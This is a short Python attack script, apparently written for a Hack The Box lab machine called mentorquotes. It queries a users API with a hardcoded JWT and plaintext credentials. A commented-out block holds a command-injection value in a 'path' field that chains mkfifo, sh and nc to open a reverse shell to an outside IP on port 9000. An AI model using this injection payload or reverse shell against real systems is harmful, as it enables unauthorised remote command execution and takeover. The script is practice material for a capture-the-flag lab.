#!env python3

import requests

url = 'http://api.mentorquotes.htb/'
api = 'users/'

# data = {
# 	"email": "james1@mentorquotes.htb",
# 	"username": "james",
# 	"password": "ilovekira",
# }

data = {
	"email": "james@mentorquotes.htb",
	"username": "james",
	"password": "kj23sadkj123as0-d213"
}

# data2 = {
# 	"body": "a",
# 	"path":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.21 9000 >/tmp/f;#"
# }

headers = {
	"Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
}

r = requests.get(url + api, headers=headers, json=data)
print(r.text)

